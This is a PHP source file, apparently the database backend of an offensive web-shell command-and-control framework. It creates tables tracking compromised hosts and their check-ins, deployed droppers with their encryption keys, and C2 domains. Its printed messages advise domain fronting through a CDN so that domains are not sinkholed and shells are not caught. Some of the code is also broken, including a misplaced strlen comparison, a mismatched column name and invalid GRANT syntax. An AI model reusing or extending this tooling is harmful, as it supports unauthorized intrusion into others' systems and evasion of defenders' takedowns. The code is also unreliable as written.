<?php
const allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
class postgres_checker
{
    public $er;
    public $t;

    function init_conn()
    {
        return pg_connect(sprintf("host=localhost port=5432 user=%s dbname=sloppy_bots",
            get_current_user()));

    }

    function createDB()
    {
        $sloppy_ini = parse_ini_file(getcwd() . "/includes/config/sloppy_config.ini", true);
        if (empty($sloppy_ini['sloppy_bot_user']['pass'])) {
            try {
                $outWrite = file(getcwd() . "/includes/config/sloppy_config.ini");
                $tt = fopen(getcwd() . '/includes/config/sloppy_config.ini', "w");
                $p = substr(str_shuffle(allowed_chars), 0, rand(8, 15));
                $outWrite[2] = "pass={$p}\n";
                foreach ($outWrite as $val) {
                    fwrite($tt, $val);
                }
                fclose($tt);
                echo "Please annotate this down somewhere. This will be the sloppy_bot password: " . $p . "\n";
                try {
                    pg_exec($this->init_conn(), "CREATE DATABASE sloppy_bots");
                } catch (Exception $e) {
                    echo $e->getCode() . "\n";
                    echo $e->getTraceAsString() . "\n";
                    echo $e->getLine() . "\n";
                }
                pg_exec($this->init_conn(), sprintf("CREATE ROLE sloppy_bot WITH LOGIN ENCRYPTED PASSWORD '%s'", $p));
                pg_exec($this->init_conn(), sprintf("GRANT ALL ON ALL TABLES IN SCHEMA public TO %s", get_current_user()));
                pg_exec($this->init_conn(), "GRANT INSERT,UPDATE,SELECT ON sloppy_bots_main,sloppy_bots_droppers,sloppy_bots_domains TABLES IN SCHEMA public TO sloppy_bot");
                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-')");
                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, depth TEXT NOT NULL, obfuscated TEXT NOT NULL default 'false', check_in INTEGER NOT NULL default 0, chachakey TEXT UNIQUE NOT NULL DEFAULT '-', aeskeys TEXT UNIQUE NOT NULL DEFAULT '-', xorkey TEXT NOT NULL UNIQUE DEFAULT '-')");
                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0, domain TEXT UNIQUE NOT NULL DEFAULT '-')");
                // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
                pg_exec($this->init_conn(), "COMMIT");
            } catch (Exception $ex) {
                echo $ex->getMessage() . "\n";
                echo $ex->getLine() . "\n";
                echo $ex->getTraceAsString() . "\n";
            }
        }
    }

    function checkDB()
    {
        # the idea for this, is to check to see if the db returns 1 record. if it does not, we will call create db, or start db.
        try {
            pg_exec($this->init_conn(), 'SELECT id FROM sloppy_bots_main WHERE id IS NOT NULL');
            return true;
        } catch (Exception $ee) {
            $this->createDB();
            return false;
        }
    }

    function getRecord($ip)
    {
        if (!empty($ip) && is_string($ip)) {
            $row = pg_exec($this->init_conn(), sprintf("SELECT rhost FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($ip)));
            if (!empty($row)) {
                return pg_fetch_row($row);
            } else {
                $this->createDB();
                return false;
            }
        }
        return false;
    }

    function insertRecord($host, $uri, $osType, $checkIn, $uuid, $action)
    {
        if (!empty($host) && $action === 'add') {
            try {
                pg_exec($this->init_conn(), sprintf("INSERT INTO sloppy_bots_main(rhost, uri, os_flavor, check_in, uuid) VALUES ('%s', '%s', '%s', '%s', '%s')", pg_escape_string($host), pg_escape_string($uri), pg_escape_string($osType), pg_escape_string($checkIn), pg_escape_string($uuid)));
                pg_exec($this->init_conn(), "COMMIT");
                return 1;
            } catch (Exception $exx) {
                echo $exx->getTraceAsString();
                echo $exx->getTrace();
                echo $exx->getMessage();
                echo $exx->getCode();
                $this->createDB();
                return pg_fetch_row(pg_exec($this->init_conn(), sprintf("SELECT uri from sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host))));
            }
        } elseif ($action === 'ci') {
            try {
                $counter = 0;
                $preOPwned = pg_exec($this->init_conn(), sprintf("SELECT id,check_in FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                if (!is_null(pg_fetch_row($preOPwned))) {
                    $counter = $preOPwned[1] + 1;
                } else {
                    $counter = $checkIn;
                }
                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_main SET check_in = '%d' WHERE uuid LIKE '%s'", (int)$counter, pg_escape_string($uuid)));
                pg_exec($this->init_conn(), "COMMIT");
                return 1;
            } catch (Exception $ex2) {
                echo $ex2->getTraceAsString();
                echo $ex2->getTrace();
                echo $ex2->getMessage();
                echo $ex2->getCode();
                $this->createDB();
                return 0;
            }
        } else {
            return 0;
        }
    }

    function insertCreatedDropper(string $xorKey, string $chachaKey, string $aesKey, string $whereWeStored, string $checkin, string $obfuscated, string $depth)
    {
        if (!empty($xorKey) && !empty($chachaKey) && !empty($aesKey) && !empty($whereWeStored)) {
            try {
                pg_exec($this->init_conn(), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, chachakey, aeskey, xorkey) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s')",
                    pg_escape_string($whereWeStored),
                    pg_escape_string($depth),
                    pg_escape_string($obfuscated),
                    pg_escape_string($checkin),
                    pg_escape_string($chachaKey),
                    pg_escape_string($aesKey),
                    pg_escape_string($xorKey)
                ));
            }catch (Exception $dropperE){
                echo $dropperE->getLine();
                echo $dropperE->getTrace();
                echo $dropperE->getTraceAsString();
                echo $dropperE->getMessage();
            }
        }

    }

    function countUsedDomains(string $dom)
    {
        if (!empty($dom)){
            $usedDoms = pg_exec($this->init_conn(), sprintf("SELECT uses FROM sloppy_bots_domains WHERE domain = '%s'", pg_escape_string($dom)));
            $dUses = pg_fetch_row($usedDoms);
            if (strlen($dUses[0] > 3)){
                print("Hey there, it looks like you have used this domain at least 3 times.\nIt would be very smart to use a CDN to avoid this domain being sinkholed.");
                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_domains SET uses = '%d' WHERE domain = '%s'", $dUses[0]+1, pg_escape_string($dom)));
                pg_exec($this->init_conn(), "COMMIT");
                return $dom;
            }else if ($dUses[0] > 10){
                print("Look, I know that setting up CDN's can appear to be rough.\n but i promise you, its better to set up a CDN and domain front through that, than your shell being caught.\n");
                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_domains SET uses = '%d' WHERE domain = '%s'", $dUses[0]+1, pg_escape_string($dom)));
                pg_exec($this->init_conn(), "COMMIT");
                return 0;
            }else{
                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_domains SET uses = '%d' WHERE domain = '%s'", 1, pg_escape_string($dom)));
                pg_exec($this->init_conn(), "COMMIT");
                return $dom;
            }
        }
        return 0;
    }
}